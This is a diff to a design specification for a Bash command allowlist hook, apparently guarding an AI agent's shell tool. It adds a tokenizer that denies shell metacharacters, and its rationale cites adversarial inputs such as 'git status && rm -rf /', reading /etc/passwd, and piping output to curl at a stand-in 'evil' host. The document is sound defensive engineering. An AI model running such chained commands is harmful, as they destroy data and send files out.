@@ -1535,15 +1535,35 @@ See section 11 R-18 for the full polyglot lifecycle risk acknowledgment. Command
 ```json
 ```
 
-The hook's `lib/allowlist_parser.py` (separated from the hook for unit-testability per SE-R1 v0.4) tokenizes the Bash command into argv via `shlex.split`. **Windows path mangling fix (B4 v0.4):** on Windows, paths with backslashes (`C:\Users\...`) must be passed through with `posix=False` to `shlex.split`, OR the canonicalizer must run first to convert paths to forward-slash form. The parser's normalized contract:
+The hook's `lib/allowlist_parser.py` (separated from the hook for unit-testability per SE-R1 v0.4) tokenizes the Bash command into argv via `shlex.shlex(... posix=True, punctuation_chars=True)` with `whitespace_split=True`, and **denies on detection** of any shell control token (W3-NEW3, v1.1.0 walkback Wave 3b commit 2). The deny-on-detect contract is *strictly more restrictive* than per-segment allowlist validation: a single shell metacharacter anywhere in the argv stream denies the entire input, even if every segment in isolation would have been allowlisted. **Windows path note (B4 v0.4 origin, refined v1.1.0):** on Windows, the Bash tool runs Git Bash (MSYS, posix semantics), and PowerShell quoting collapses to posix-equivalent at the hook boundary, so the parser uses `posix=True` *regardless of `os.name`*. An earlier v0.4 design draft used `posix=False` on Windows to preserve backslashes; that path was abandoned because `posix=False` combined with `punctuation_chars=True` mistokenizes legitimate quoted arguments (e.g. `git log --grep="a;b"` falsely splits on the inner `;`). The canonicalizer (`lib/canonicalize-path.py`) runs at a separate layer for path normalization, leaving the tokenizer free to use posix mode. The parser's actual contract:
 
 ```python
-# B4 v0.4 - Windows-safe argv tokenization
+# v1.1.0 W3-NEW3: deny-on-detect via shlex.shlex + punctuation_chars
+# (replaces v0.4 B4 shlex.split with posix=False on Windows)
+_SHELL_CONTROL_TOKENS = frozenset({
+    ';', '&&', '||', '|', '&', '>', '>>', '<', '<<', '<<<', '(', ')',
+})
+_COMMAND_SUBSTITUTION_SIGILS = ('$(', '`')
+
 def tokenize(cmd: str) -> list[str]:
-    if os.name == 'nt':
-        return shlex.split(cmd, posix=False)  # preserves backslashes
-    return shlex.split(cmd, posix=True)
+    if '\n' in cmd or '\r' in cmd:
+        raise AllowlistError("denied: multi-line command disallowed")
+    for sigil in _COMMAND_SUBSTITUTION_SIGILS:
+        if sigil in cmd:
+            raise AllowlistError("denied: command substitution disallowed")
+    lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
+    lex.whitespace_split = True
+    try:
+        tokens = list(lex)
+    except ValueError as e:
+        raise AllowlistError(f"denied: unparsable command ({e})")
+    for tok in tokens:
+        if tok in _SHELL_CONTROL_TOKENS:
+            raise AllowlistError("denied: shell metacharacter disallowed")
+    return tokens
 ```
+
+The user-visible consequence: callers needing pipelines (`git fetch && git rebase`) must split into two separate Bash invocations. The split-validate variant (validate each segment independently against the allowlist) is documented as a v1.x backlog refinement that would relax this gate, but the deny-on-detect path was chosen because it ships zero false-negatives on adversarial inputs (`git status && rm -rf /`, `git log; cat /etc/passwd`, `git diff | curl http://evil/`) at the cost of denying legitimate compounds — a trade explicitly accepted in the W3-NEW3 closure (see CHANGELOG).
 
 **Canonicalization at argv-shape layer (SE-N2 v0.5):** `under:` constraint paths and `denyGlobs` in git-add-explicit (and any other rule using path constraints) are canonicalized via `lib/canonicalize-path.py` BEFORE glob match. This ensures `git add C:\PROGRA~1\foo\.HUSKY\hook` (8.3 + mixed case) collapses to its long-path canonical form and matches `**/.husky/**`. Canonicalization runs at BOTH the section 12.2 argv-shape layer (Bash tool) and the section 12.3 path-guard layer (Edit/Write tools). Fixture: `deny-canonicalize-git-add-83-shortname.json`. (SE-N2 v0.5)
 
